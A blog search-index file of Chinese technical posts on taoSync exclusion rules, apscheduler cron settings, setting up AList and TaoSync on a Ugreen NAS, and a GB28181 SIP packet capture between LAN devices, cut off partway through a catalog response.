<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>taoSync排除项简易教程</title>
    <link href="/2024/09/newpost-60/"/>
    <url>/2024/09/newpost-60/</url>
    
    <content type="html"><![CDATA[<p><code>taoSync</code>的排除项规则是一种类似<code>gitignore</code>的规则，但不支持[非]的语法（即<code>!</code>），优先级未得到正确支持（详见<a href="https://github.com/bitranox/igittigitt?tab=readme-ov-file#limitations">这里</a>）;</p><p><code>taoSync</code>规定的排除项根目录为同步来源或目标目录，例如你的来源目录为<code>/baidu/pan/</code>，使用规则<code>/123321/*</code>将忽略目录<code>/baidu/pan/123321/</code>下的文件；使用<code>/baidu/*</code>不会有效果。</p><span id="more"></span><h3 id="规则简单说明"><a href="#规则简单说明" class="headerlink" title="规则简单说明"></a>规则简单说明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gitignore">.*              表示忽略所有 . 开头的文件和目录<br>*.a             表示忽略所有 .a 结尾的文件<br>/a.jpg          表示仅仅忽略项目根目录下的 a.jpg 文件，不包括 /abc/a.jpg<br>data/:          表示忽略data目录下的所有内容，不忽略 data 文件<br>/data:          表示忽略根目录下的data文件<br>/*.pdf:         表示忽略/a.pdf，不忽略 /doc/a.pdf<br>**/a.txt:       表示忽略/a.txt,a/a.txt,a/b/a.txt等<br>a/**/b.txt:     表示忽略a/b.txt, a/x/b.txt,a/x/y/b.txt等<br>/mtk/do.doc     表示过滤某个具体文件<br>fd1/*           表示忽略/fd1/，/fd0/df1/等下所有文件<br>/fd1/*          表示忽略/fd1/下所有文件，不包括/fd0/fd1/,/fd2/fd1/等<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>经验</tag>
      
      <tag>文档</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>apscheduler的cron配置项</title>
    <link href="/2024/08/newpost-58/"/>
    <url>/2024/08/newpost-58/</url>
    
    <content type="html"><![CDATA[<h2 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h2><table><thead><tr><th>字段</th><th>意义</th><th>示意值/部分可选值范围/部分可用值</th></tr></thead><tbody><tr><td>year</td><td>年</td><td>2024</td></tr><tr><td>month</td><td>月</td><td>1-12</td></tr><tr><td>day</td><td>日</td><td>1-31</td></tr><tr><td>week</td><td>周</td><td>1-53</td></tr><tr><td>day_of_week</td><td>周几</td><td>0-6 或 mon,tue,wed,thu,fri,sat,sun</td></tr><tr><td>hour</td><td>时</td><td>0-23</td></tr><tr><td>minute</td><td>分</td><td>0-59</td></tr><tr><td>second</td><td>秒</td><td>0-59</td></tr><tr><td>start_date</td><td>开始日期</td><td>2024-01-01</td></tr><tr><td>end_date</td><td>结束日期</td><td>2024-12-31</td></tr></tbody></table><blockquote><p>通常来讲，如需使用<code>week</code>/<code>day_of_week</code>，就应保持<code>month</code>/<code>day</code>为空，反之亦然；</p></blockquote><blockquote><p><code>year</code>&gt;<code>month</code>&gt;<code>day</code>&gt;<code>hour</code>&gt;<code>minute</code>&gt;<code>second</code> 或 <code>year</code>&gt;<code>week</code>&gt;<code>day_of_week</code>&gt;<code>hour</code>&gt;<code>minute</code>&gt;<code>second</code><br>通常来讲，如果上边的某一项有值，则其前默认为<code>*</code>，其后默认为起始值（<code>0</code>或<code>1</code>）。<br>例如<code>hour</code>为<code>2</code>，其余为空，表示<code>*</code>年<code>*</code>月<code>*</code>日<code>2</code>时<code>0</code>分<code>0</code>秒，即每天2点调用。</p></blockquote><h2 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h2><p>每个字段（不包括<code>start_date</code>与<code>end_date</code>）除了可以填入上边的示意值外，还可以使用表达式，如下：</p><table><thead><tr><th align="left">表达式</th><th align="left">适用字段</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>*</code></td><td align="left">所有</td><td align="left">每个值都触发</td></tr><tr><td align="left"><code>*/a</code></td><td align="left">所有</td><td align="left">每隔<code>a</code>触发一次</td></tr><tr><td align="left"><code>a-b</code></td><td align="left">所有</td><td align="left">在<code>a</code>-<code>b</code>的区间每个值都触发（<code>a</code>&lt;<code>b</code>）</td></tr><tr><td align="left"><code>a-b/c</code></td><td align="left">所有</td><td align="left">在<code>a</code>-<code>b</code>的区间每隔<code>c</code>触发</td></tr><tr><td align="left"><code>xth y</code></td><td align="left"><code>day</code></td><td align="left">第<code>x</code>个星期<code>y</code>触发</td></tr><tr><td align="left"><code>last y</code></td><td align="left"><code>day</code></td><td align="left">最后一个星期<code>y</code>触发</td></tr><tr><td align="left"><code>last</code></td><td align="left"><code>day</code></td><td align="left">一个月的最后一天触发</td></tr><tr><td align="left"><code>x,y,z</code></td><td align="left">所有</td><td align="left">可以组合上边的表达式</td></tr></tbody></table><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><ul><li><p>每天凌晨2点执行</p><ul><li>hour: 2</li></ul></li><li><p>每两小时执行一次</p><ul><li>hour: */2</li></ul></li><li><p>每5分钟运行一次</p><ul><li>minute: */5</li></ul></li><li><p>每个月最后一天凌晨0点运行</p><ul><li>day: last</li></ul></li><li><p>1-2,4,6-9月 第三个星期一的01:00,02:00,03:00执行</p><ul><li><p>month: 1-2,4,6-9</p></li><li><p>day: 3rd mon</p></li><li><p>hour: 1-3</p></li></ul></li><li><p>每周一到周五凌晨1点半运行，直到2030-01-01</p><ul><li><p>day_of_week: mon-fri</p></li><li><p>hour: 1</p></li><li><p>minute: 30</p></li><li><p>end_date: 2030-01-01</p></li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何在绿联NAS中使用TaoSync同步我的文件到各个网盘</title>
    <link href="/2024/07/newpost-57/"/>
    <url>/2024/07/newpost-57/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>在绿联NAS中使用<a href="https://github.com/dr34m-cn/taosync">TaoSync</a>自动定时同步我的文件到各个网盘。</p><span id="more"></span><p><strong>如果好用欢迎Star：<a href="https://github.com/dr34m-cn/taosync">https://github.com/dr34m-cn/taosync</a>，非常感谢！</strong></p><p>TaoSync基于<a href="https://alist.nn.ci/zh/">AList</a>实现自动同步功能，可以实现以下不同网盘或存储之间的自动定时同步。</p><ul><li>本地存储</li><li><a href="https://www.alipan.com/">阿里云盘</a></li><li>OneDrive / Sharepoint（<a href="https://www.office.com/">国际版</a>, <a href="https://portal.partner.microsoftonline.cn/">世纪互联</a>,de,us）</li><li> <a href="https://cloud.189.cn/">天翼云盘</a> (个人云, 家庭云)</li><li><a href="https://drive.google.com/">GoogleDrive</a></li><li><a href="https://www.123pan.com/">123云盘</a></li><li>FTP / SFTP</li><li><a href="https://www.mypikpak.com/">PikPak</a></li><li><a href="https://aws.amazon.com/cn/s3/">S3</a></li><li><a href="https://seafile.com/">Seafile</a></li><li><a href="https://www.upyun.com/products/file-storage">又拍云对象存储</a></li><li>WebDav(支持无API的OneDrive/SharePoint)</li><li>Teambition（<a href="https://www.teambition.com/">中国</a>，<a href="https://us.teambition.com/">国际</a>）</li><li><a href="https://www.mediatrack.cn/">分秒帧</a></li><li><a href="https://yun.139.com/">和彩云</a> (个人云, 家庭云)</li><li><a href="https://disk.yandex.com/">Yandex.Disk</a></li><li><a href="http://pan.baidu.com/">百度网盘</a></li><li><a href="https://drive.uc.cn/">UC网盘</a></li><li><a href="https://pan.quark.cn/">夸克网盘</a></li><li><a href="https://pan.xunlei.com/">迅雷网盘</a></li><li><a href="https://www.lanzou.com/">蓝奏云</a></li><li><a href="https://www.ilanzou.com/">蓝奏云优享版</a></li><li><a href="https://www.alipan.com/">阿里云盘分享</a></li><li><a href="https://photos.google.com/">谷歌相册</a></li><li><a href="https://mega.nz/">Mega.nz</a></li><li><a href="https://photo.baidu.com/">一刻相册</a></li><li>SMB</li><li><a href="https://115.com/">115</a></li><li>Cloudreve</li><li><a href="https://www.dropbox.com/">Dropbox</a></li><li><a href="https://www.feijipan.com/">飞机盘</a></li><li><a href="https://www.dogecloud.com/product/oss">多吉云</a></li></ul><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>由于国内Docker镜像被墙，各大加速镜像站也不可用，需要你自行解决这个问题。目前可以通过在加速器URL中添加下边的链接实现，但随着时间的推移此链接可能随时失效。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//docker.hlyun<span class="hljs-meta">.org</span><br></code></pre></td></tr></table></figure><img src="/2024/07/newpost-57/image-20240716205710076.png" class="" title="image-20240716205710076"><h2 id="一、AList安装"><a href="#一、AList安装" class="headerlink" title="一、AList安装"></a>一、AList安装</h2><p>镜像仓库搜索<code>alist</code>，找到下边的下载</p><img src="/2024/07/newpost-57/image-20240716205824967.png" class="" title="image-20240716205824967"><p>到镜像页面确认其下载完成后，点击后边的新建，参考配置如下</p><img src="/2024/07/newpost-57/image-20240717164050496.png" class="" title="image-20240717164050496"><p>创建之后，点击左侧容器菜单，找到创建的容器点击名字进去，点开日志可以看到密码</p><img src="/2024/07/newpost-57/image-20240716211206710.png" class="" title="image-20240716211206710"><p>通过下边的地址即可访问，输入账号<code>admin</code>，密码上边获取的，进去后点下边的管理，点左侧存储，点添加，然后按照<a href="https://alist.nn.ci/zh/guide/drivers/">官方文档</a>添加存储</p><img src="/2024/07/newpost-57/image-20240716212528308.png" class="" title="image-20240716212528308"><p>如果要添加本地存储，建议可以通过smb的方式添加，地址为NAS的IP地址，例如我是<code>192.168.31.2</code>，用户名密码就是你绿联的用户名密码，分享名称如果是个人文件夹是<code>personal_folder</code>，更多可以在电脑地址栏输入<code>\\192.168.x.x</code>查看，如下图</p><img src="/2024/07/newpost-57/image-20240716212001394.png" class="" title="image-20240716212001394"><h2 id="二、TaoSync安装"><a href="#二、TaoSync安装" class="headerlink" title="二、TaoSync安装"></a>二、TaoSync安装</h2><p>镜像仓库搜索<code>tao-sync</code>，找到下边的下载</p><img src="/2024/07/newpost-57/image-20240716212227217.png" class="" title="image-20240716212227217"><p>下载完成后在镜像仓库点新建，可以参考下边的配置</p><img src="/2024/07/newpost-57/image-20240717163924294.png" class="" title="image-20240717163924294"><p>点开容器在日志中可以看到admin的密码</p><img src="/2024/07/newpost-57/image-20240716212442276.png" class="" title="image-20240716212442276"><p>通过下边的地址访问后，输入用户名admin以及上边的密码进入</p><blockquote><p>如果日志中没有输出密码，也可以到挂载路径的/log/sys_xxxx.log文件查看密码，通常在第一行</p><p>或者进入docker命令行，cd /app/data/log/，然后ls获取到文件名，cat sys_xxxx.log查看</p></blockquote><img src="/2024/07/newpost-57/image-20240716212552081.png" class="" title="image-20240716212552081"><p>然后创建引擎，输入AList地址（例如我的是<code>http://192.168.31.2:5244</code>，请改为你自己的）与令牌（到AList管理-设置-其他中复制，截图中的令牌已经被重置了，不要动歪心思）</p><img src="/2024/07/newpost-57/image-20240722164129944.png" class="" title="image-20240722164129944"><img src="/2024/07/newpost-57/image-20240722164022473.png" class="" title="image-20240722164022473"><p>然后可以进入作业管理新建作业啦，先选择引擎，然后选择你要备份的目录（来源目录），与你想要备份到哪里（目标目录，可以选择多个），点击确定，备份即可开始！</p><img src="/2024/07/newpost-57/image-20240716213109202.png" class="" title="image-20240716213109202"><p>你可以随时点进作业详情查看进度，如果文件较多较大，可能会很耗时间，建议刚开始不要操作以免加重负担</p>]]></content>
    
    
    
    <tags>
      
      <tag>经验</tag>
      
      <tag>分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GB28181抓包记录</title>
    <link href="/2024/05/newpost-56/"/>
    <url>/2024/05/newpost-56/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>记录GB28181交互过程，以便相关开发研究</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="一-环境"><a href="#一-环境" class="headerlink" title="一. 环境"></a>一. 环境</h2><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>地址：192.168.6.71</p><p>端口：5060</p><p>编码：34020000001320000002</p><p>通道编号：34020000001310000001</p><p>报警通道编号：34020000001340000001</p><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>地址：192.168.6.106</p><p>端口：5062</p><p>编码：34020000002000000010</p><p>域：3402000000</p><h2 id="二、抓包报文"><a href="#二、抓包报文" class="headerlink" title="二、抓包报文"></a>二、抓包报文</h2><h3 id="1-注册相关"><a href="#1-注册相关" class="headerlink" title="1. 注册相关"></a>1. 注册相关</h3><h4 id="1-1-注册"><a href="#1-1-注册" class="headerlink" title="1.1 注册"></a>1.1 注册</h4><p>客户端-&gt;服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sip">REGISTER sip:34020000002000000010@192.168.6.106:5062 SIP/2.0<br>Via: SIP/2.0/UDP 192.168.6.71:5060;rport;branch=z9hG4bK1251336551<br>Route: &lt;sip:34020000001320000002@192.168.6.106:5062;lr&gt;<br>From: &lt;sip:34020000001320000002@192.168.6.71:5060&gt;;tag=2088733642<br>To: &lt;sip:34020000001320000002@192.168.6.71:5060&gt;<br>Call-ID: 1881196343@192.168.6.71<br>CSeq: 1 REGISTER<br>Contact: &lt;sip:34020000001320000002@192.168.6.71:5060&gt;<br>Max-Forwards: 70<br>User-Agent: SIP UAS V3.0.0.675168<br>Expires: 3600<br>Content-Length: 0<br><br><br></code></pre></td></tr></table></figure><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">401</span> Unauthorized<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.71:5060</span>;rport=<span class="hljs-number">5060</span>;branch=z9hG4bK1251336551<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">2088733642</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">3241172924</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1881196343</span>@<span class="hljs-number">192.168.6.71</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">1</span> REGISTER<br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">WWW</span>-Authenticate: Digest realm=<span class="hljs-string">&quot;34020000&quot;</span>,algorithm=MD5,nonce=<span class="hljs-string">&quot;1715926053&quot;</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T14:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">232</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">REGISTER</span> sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.71:5060</span>;rport;branch=z9hG4bK1442331620<br><span class="hljs-attribute">Route</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.106:5062</span>;lr&gt;<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">2088733642</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1881196343</span>@<span class="hljs-number">192.168.6.71</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">2</span> REGISTER<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Authorization</span>: Digest username=<span class="hljs-string">&quot;34020000001320000002&quot;</span>, realm=<span class="hljs-string">&quot;34020000&quot;</span>, nonce=<span class="hljs-string">&quot;1715926053&quot;</span>, uri=<span class="hljs-string">&quot;sip:34020000002000000010@192.168.6.106:5062&quot;</span>, response=<span class="hljs-string">&quot;fa983ee8abd2b6ff36b857c660b06f67&quot;</span>, algorithm=MD5<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Expires</span>: <span class="hljs-number">3600</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.71:5060</span>;rport=<span class="hljs-number">5060</span>;branch=z9hG4bK1442331620<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">2088733642</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">3666500293</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1881196343</span>@<span class="hljs-number">192.168.6.71</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">2</span> REGISTER<br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T14:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">263</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h4 id="1-2-心跳"><a href="#1-2-心跳" class="headerlink" title="1.2 心跳"></a>1.2 心跳</h4><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MESSAGE</span> sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.71:5060</span>;rport;branch=z9hG4bK677047196<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1166693770</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">632317300</span>@<span class="hljs-number">192.168.6.71</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Type: Application/MANSCDP+xml<br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">180</span><br><br><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;GB2312&quot;</span> ?&gt;</span><br><span class="hljs-section">&lt;Notify&gt;</span><br>    <span class="hljs-section">&lt;CmdType&gt;</span><span class="hljs-attribute">Keepalive</span>&lt;/CmdType&gt;<br>    <span class="hljs-section">&lt;SN&gt;</span><span class="hljs-attribute">539</span>&lt;/SN&gt;<br>    <span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001320000002</span>&lt;/DeviceID&gt;<br>    <span class="hljs-section">&lt;Status&gt;</span><span class="hljs-attribute">OK</span>&lt;/Status&gt;<br><span class="hljs-section">&lt;/Notify&gt;</span><br><br></code></pre></td></tr></table></figure><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.71:5060</span>;rport=<span class="hljs-number">5060</span>;branch=z9hG4bK677047196<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1166693770</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">2798064128</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">632317300</span>@<span class="hljs-number">192.168.6.71</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h3 id="2-设备查询"><a href="#2-设备查询" class="headerlink" title="2. 设备查询"></a>2. 设备查询</h3><h4 id="2-1-Catalog"><a href="#2-1-Catalog" class="headerlink" title="2.1 Catalog"></a>2.1 Catalog</h4><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MESSAGE</span> sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK3012865820<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">842983226</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2898046025</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">Content</span>-Type: application/MANSCDP+xml<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T14:<span class="hljs-number">18</span>:<span class="hljs-number">02</span>.<span class="hljs-number">573</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">125</span><br><br><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-section">&lt;Query&gt;</span><br><span class="hljs-section">&lt;CmdType&gt;</span><span class="hljs-attribute">Catalog</span>&lt;/CmdType&gt;<br><span class="hljs-section">&lt;SN&gt;</span><span class="hljs-attribute">7</span>&lt;/SN&gt;<br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001320000002</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;/Query&gt;</span><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK3012865820<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">842983226</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1838534428</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2898046025</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 